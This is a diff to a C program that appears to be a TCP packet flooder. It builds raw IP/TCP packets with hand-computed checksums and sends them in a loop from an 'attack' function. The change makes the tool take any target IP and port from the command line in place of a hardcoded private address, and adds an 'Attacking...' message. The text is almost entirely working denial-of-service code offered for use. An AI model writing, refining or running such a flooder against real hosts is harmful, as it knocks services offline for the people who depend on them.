@@ -9,7 +9,6 @@
 #include <sys/socket.h>
 #include <netinet/tcp.h>
 #include <netinet/ip.h>
-#include <fcntl.h>
 
 //Used to checksum calculation
 struct pseudo_header {
@@ -23,15 +22,22 @@ struct pseudo_header {
 };
 
 int createSocket(void);
-void attack(const char* dest_ip, int dest_port);
+void attack(const char* dest_ip, const int dest_port);
 unsigned short csum(unsigned short *ptr, int nbytes);
 
-int main (int argc, char *argv[]) {
-	const char* dest_ip = "10.202.82.90";
-	int dest_port = 80;
+int main (int argc, char* argv[]) {
+	
+	if(argc < 3){
+		printf("Usage: ./flood <ip> <port>\n");
+		exit(-1);
+	}
+	
+	const char* dest_ip = argv[1];
+	const int dest_port = atoi(argv[2]);
 
+	printf("Attacking %s:%d...\n", dest_ip, dest_port);
+	
 	attack(dest_ip, dest_port);
-
 	return 0;
 }
 
@@ -40,28 +46,21 @@ int createSocket(void) {
 	int fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 
 	if(fd < 0) {
-		printf("Error creating raw socket. Error number : %d . Error message : %s \n", errno, strerror(errno));
+		printf("Error creating raw socket. Error number: %d. Error message: %s\n", errno, strerror(errno));
 		exit(-1);
 	}
 
 	//IP_HDRINCL to tell the kernel that headers are included in the packet
 	int one = 1;
 	if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) < 0) {
-		printf("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n", errno, strerror(errno));
-		exit(-1);
-	}
-
-	//Set to non-block
-	int flags = fcntl(fd, F_GETFL, 0);
-	if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {
-		printf("Error setting non-block mode. Error number : %d . Error message : %s \n", errno, strerror(errno));
+		printf("Error setting IP_HDRINCL. Error number: %d. Error message: %s\n", errno, strerror(errno));
 		exit(-1);
 	}
 
 	return fd;
 }
 
-void attack(const char* dest_ip, int dest_port) {
+void attack(const char* dest_ip, const int dest_port) {
 	int fd = createSocket();
 
 	//Datagram to represent the packet
@@ -135,8 +134,8 @@ void attack(const char* dest_ip, int dest_port) {
 
 		tcph->check = csum((unsigned short*)&psh, sizeof(struct pseudo_header));
 
-		if(sendto(fd, datagram, iph->tot_len, MSG_DONTWAIT, (struct sockaddr*)&sin, sizeof(struct sockaddr_in)) < 0) {
-			printf("Error sending packet. Error number : %d . Error message : %s \n", errno, strerror(errno));
+		if(sendto(fd, datagram, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(struct sockaddr_in)) < 0) {
+			printf("Error sending packet. Error number: %d. Error message: %s\n", errno, strerror(errno));
 		}
 	}
 }
